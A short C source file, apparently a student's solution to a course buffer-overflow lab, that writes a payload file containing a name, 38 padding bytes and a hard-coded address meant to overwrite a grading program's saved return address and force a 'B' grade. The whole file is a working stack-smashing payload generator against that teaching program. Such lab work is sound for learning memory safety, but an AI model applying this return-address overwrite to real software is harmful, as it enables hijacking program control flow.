/*
 * createdataB.c
 * Purpose: Produces a file called dataB with the student name, a 
 * nullbyte, padding to overrun the stack, and the address of the 
 * instruction in main to get a B, the latter of which will overwrite 
 * getName's stored x30.
 */

#include <stdio.h>
#include <stdlib.h>

int main(void) {
    int i;

    /* Student name for the grader output */
    char name[] = "Emily Qian";

    /* The address to overwrite the return pointer (example: grade = "B") */
    const unsigned int returnAddress = 0x400890;

    /* Open the file "dataB" for writing */
    FILE *psFile = fopen("dataB", "wb");
    if (psFile == NULL) {
        perror("Error opening file"); 
        return 1;  /* Return error code if file opening fails */
    }

    /* Step 1: Write the name */
    fwrite(name, sizeof(char), sizeof(name) - 1, psFile);

    /* Step 2: Add null bytes to fill the buffer and 
    reach the saved return address */
    for (i = 0; i < 38; i++) {
        fputc(0x00, psFile);  /* Write 38 null bytes to pad the buffer */
    }

    /* Step 3: Overwrite the return address */
    fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);

    /* Close the file */
    fclose(psFile);

    return 0;
}
